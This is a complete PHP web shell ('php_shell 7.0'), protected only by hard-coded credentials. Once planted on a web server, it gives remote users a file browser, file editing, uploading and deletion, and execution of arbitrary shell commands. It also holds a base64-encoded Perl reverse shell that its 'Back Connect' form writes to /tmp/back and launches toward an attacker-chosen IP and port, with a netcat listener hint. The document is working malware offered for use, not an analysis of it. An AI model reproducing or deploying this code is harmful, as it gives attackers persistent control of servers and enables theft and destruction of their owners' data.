<?php
ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

$login = "qwe";
$password = "qwe";

if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="VP Войдите"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Cancel';
    exit;
} else {
    //echo "<p>Hello {$_SERVER['PHP_AUTH_USER']}.</p>";
    //echo "<p>Вы ввели пароль {$_SERVER['PHP_AUTH_PW']}.</p>";
}

if(isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW']) && $_SERVER['PHP_AUTH_USER'] == $login && $_SERVER['PHP_AUTH_PW'] == $password)
{
} else {
	header('WWW-Authenticate: Basic realm="VP Войдите"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Cancel';
	die;
}

class fileCustom
{
	public $file = false;
	public $owner = false;
	public $is_dir = -1;
	public $is_writable = false;
	public $size = -1;
	public $chmod = false;
	
	public function __construct($file)
	{
		
		if(!file_exists($file))
		{
			return false;
		}
		$this->file = $file;
		
		if(is_dir($this->file))
		{
			$this->is_dir = true;
		} else {
			$this->is_dir = false;
		}
		
		$this->is_writable = (is_writable($this->file)) ? true : false;
		
		if(!$this->is_dir)
		{
			$this->size = round((int)filesize($this->file) / 1024, 2);
		}
		
		$this->owner = posix_getpwuid( fileowner($this->file))["name"];
		$this->chmod = substr(sprintf('%o', fileperms($this->file)), -4);
	}
	
	public function isWriteble()
	{
		return $this->is_writable;
	}
	
	public function getOwner()
	{
		return $this->owner;
	}
	
	public function getSize()
	{
		if($this->is_dir)
		{
			return "Dirrecory";
		}
		return $this->size . " KB";
	}
	
	public function getChmod()
	{
		return $this->chmod;
	}
}

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

class php_shell {
	public $homeDir = false;
	public $currentDir = false;
	public $arrDirElems = array();
	public $filesCurrentDir = array();
	public $dataOpenedFile = false;
	public $errors = array();
	public $flash = array();
	public $result = false;
	
	public function __construct()
	{
		session_start();
		$this->currentDir = $this->homeDir = dirname(__FILE__);
		if(isset($_REQUEST["dir"]))
		{
			$this->currentDir = $_REQUEST["dir"];

		}
		
		$this->arrDirElems = explode("/", $this->currentDir);
		
		$this->reloadFileManadger();
	}
	
	public function reloadFileManadger()
	{
		$fl = new fileCustom($this->currentDir);
		if(!$fl->is_dir)
		{
			$this->viewFile($this->currentDir);
			return false;
		}
		
		$this->filesCurrentDir = scandir($this->currentDir . "/");
		
		$sortDir = array();
		$sortFiles = array();
		foreach($this->filesCurrentDir as $id => $item)
		{
			if($id ==0 || $id == 1) continue;
			
			if(is_dir($item)) {
				$sortDir[] = $item;
			} else {
				$sortFiles[] = $item;
			}

		}
		
		sort($sortDir);
		sort($sortFiles);
		$this->filesCurrentDir = $sortDir;
		foreach($sortFiles as $file)
		{
			$this->filesCurrentDir[] = $file;
		}
		//var_dump($sortDir);
	}
	
	public function deleteFile($file)
	{
		if(file_exists($file))
		{
			unlink($file);
			$this->reloadFileManadger();
		}
	}
	
	public function uploadFile($key, $filename)
	{
		if(is_uploaded_file($_FILES[$key]["tmp_name"]))
		{
			move_uploaded_file($_FILES[$key]["tmp_name"], $this->currentDir . "/" . $filename);
			//echo $_FILES["videoname"]["name"] . " Файл загружен<br />";
			$this->reloadFileManadger();
			$this->flash[] = "File uploaded";
		} else {
			echo("Ошибка загрузки файла");
			die();
		}
	}
	
	public function viewFile($file)
	{
		$size = filesize($file);
		if($size <= 1024 * 1024)
		{
			$this->dataOpenedFile = file_get_contents($file);
		} else {
			$this->errors[] = "Big file > 1MB";
		}
	}
	
	public function saveFile($file, $data)
	{
		$fl = new fileCustom($file);
		if($fl->is_writable)
		{
			file_put_contents($file, $data);
			$this->viewFile($file);
			$this->flash[] = "File edited!";
		} else {
			$this->errors[] = "File not writeble";
		}
	}
	
	public function dispatcher()
	{
		$action = (isset($_REQUEST["a"])) ? $_REQUEST["a"] : false;
		$file = (isset($_REQUEST["file"])) ? $_REQUEST["file"] : false;
		
		if($action == "del")
		{
			$this->deleteFile($file);
		}
		
		if($action == "upload")
		{
			if(isset($_FILES["file"]) && $_FILES["file"]["name"])
			{
				$this->uploadFile("file", $_FILES["file"]["name"]);
			}
		}
		
		if($action == "save" && isset($_REQUEST["data"]))
		{
			$this->saveFile($this->currentDir, $_REQUEST["data"]);
		}
		
		if($action == "exec")
		{
			$command = (isset($_REQUEST["command"])) ? $_REQUEST["command"] : false;
			if($command)
			{

				$this->result = true;

			}
		}
		
		if($action == "back")
		{
			global $back_connect;
			echo "connect to server: " . $_POST['ip'].":".$_POST['port'];
			file_put_contents("/tmp/back", base64_decode($back_connect));
			system("chmod +x /tmp/back");
			system("perl /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
			echo "back";
			die;
		}
	}
	
	function maxUploadFileSize()
	{
		$maxUpload = (int)ini_get("upload_max_filesize");
		$maxPost = (int)ini_get("post_max_size");
		if($maxUpload < $maxPost)
		{
			$maxPost = $maxUpload;
		}
		return $maxPost;
	}
}



$shell = new php_shell();
$shell->dispatcher();
?>

<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>LizzZ/Jibril/Slaid php_shell 7.0</title>
	
	<style>
		.dialog {
			padding: 10px;
			border: 1px solid #ccc;
			display: inline-block;
			vertical-align: top;
			margin: 10px;
		}
		
		h3 {
			margin: 0px 0px 15px 0px;
		}
		
		.path_nav li  {
			list-style-type: none;
			display: inline-block;
			padding: 0px;
			margin: 0px;
		}
		
		.path_nav {
			display: inline-block;
			margin: 0;
			padding: 0;
		}
		
		.error-block {
			padding: 10px;
		}
	</style>
</head>
<body>
	<h1>Php7 shell</h1>
	<div class="info">
		<p>Version: <b><?php echo phpversion(); ?></b> User: <b><?php echo get_current_user(); ?></b></p>
	</div>
	<div class="file_manager">
		<div class="nav-block">
			<a href="/?dir=<?php echo $shell->homeDir; ?>">Home</a>: &nbsp; 
			<ul class="path_nav">
				<?php $dir = ""; ?>
				<li><a href="/?dir=">root</a></li>
				
				<?php foreach($shell->arrDirElems as $index => $item): if($index == 0) continue; ?>
				<?php 
					$dir .= "/" . $item;
				?>
				<li><a href="/?dir=<?php echo $dir; ?>">/<?php echo $item; ?></a></li>
				<?php endforeach; ?>
			</ul>
		</div>
		
		<div class="error-block">
			<?php if(count($shell->errors) > 0): ?>
				<?php foreach($shell->errors as $error): ?>
					<p>Error: <b style="color:red"><?php echo $error; ?></b></p>
				<?php endforeach; ?>
			<?php endif; ?>
			
			<?php if(count($shell->flash) > 0): ?>
				<?php foreach($shell->flash as $msg): ?>
					<p>Message: <b style="color:green"><?php echo $msg; ?></b></p>
				<?php endforeach; ?>
			<?php endif; ?>
		</div>
		
		<?php if($shell->result) :?>
			<div class="system-exec">
				<textarea name="data" style="width: 800px; height: 400px;"><?php system($_REQUEST["command"]); ?></textarea>
			</div>
		<?php elseif($shell->dataOpenedFile) : ?>
			<div class="dialog edit-block">
				<form action="" method="POST">
					
					<textarea name="data" style="width: 800px; height: 400px;"><?php echo $shell->dataOpenedFile; ?></textarea>
					<input type="hidden" name="a" value="save" />
					<br /><br />
					<button>Save</button>
				</form>
			</div>
		<?php else: ?>
			<table>
				<tr>
					<th>filename</th>
					<th>owner</th>
					<th>size</th>
					<th>chmod</th>
					<th>action</th>
				</tr>
				<?php if(count($shell->filesCurrentDir) > 0) : ?>
				<?php foreach($shell->filesCurrentDir as $id => $filename): ?>
				<tr>
					<?php $file = new fileCustom($filename); ?>
					
					<td><a style='color:<?php echo ($file->isWriteble()) ? "green" : "red"; ?>' href="/?dir=<?php echo $shell->currentDir . "/" .  $filename; ?>"><?php echo $filename; ?></a></td>
					<td><?php echo $file->getOwner(); ?>
					<td><?php echo $file->getSize(); ?></td>
					<td><?php echo $file->getChmod(); ?></td>
					<td><a class="del" href="/?dir=<?php echo $shell->currentDir; ?>&a=del&file=<?php echo $shell->currentDir . "/" .  $filename; ?>">del</a></td>
				</tr>
				<?php endforeach; ?>
				<?php else: ?>
					<td>Dirrecory is empty</td>
				<?php endif; ?>
			</table>
		<?php endif; ?>
	</div>
	<div class="dialog">
		<h3>Execute bash command</h3>
		<form action="" method="POST">
			<input type="hidden" name="a" value="exec" />
			<input type="text" name="command" value="<?php echo (isset($_REQUEST["command"])) ? $_REQUEST["command"] : "ls -l"; ?>" />
			<button>Run</button>
		</form>
	</div> <br />
	
	<?php if(!$shell->dataOpenedFile): ?>
	<div class="dialog">
		<h3>Upload file</h3>
		<p>Is Writeble <?php echo (is_writable($shell->currentDir)) ? "<b style='color:green'>TRUE</b>" : "<b style='color:red'>FALSE</b>"; ?> <br />
		MaxUpload <?php echo $shell->maxUploadFileSize(); ?>MB</p>
		<form action="?dir=<?php echo $shell->currentDir?>&a=upload" method="POST" enctype="multipart/form-data">
			<input type="file" name="file" />
			<button>Upload</button>
		</form>
	</div><br />
	<?php endif; ?>
	
	
	<div class="dialog">
		<h3>Back Connect</h3>
		<p>nc -l -n -v -p 31373</p>
		<form target="_blank" action="?dir=<?php echo $shell->currentDir?>&a=back" method="POST">
			<input type="text" name="ip" value="<?php echo $_SERVER["REMOTE_ADDR"];?>" />
			<input type="text" name="port" value="31373" />
			<button>Connect</button>
		</form>
	</div><br />
	
	<script>
		(function() {
			let itemsDel = document.querySelectorAll(".del");
			if(itemsDel && itemsDel.length > 0)
			{
				itemsDel.forEach(function(elem) {
					elem.addEventListener("click", function(e) {
						if(!confirm("Delete?")) 
						{
							e.stopPropagation();
							e.preventDefault();
						}
					});
				});
			}
		})();
	</script>
</body>
</html>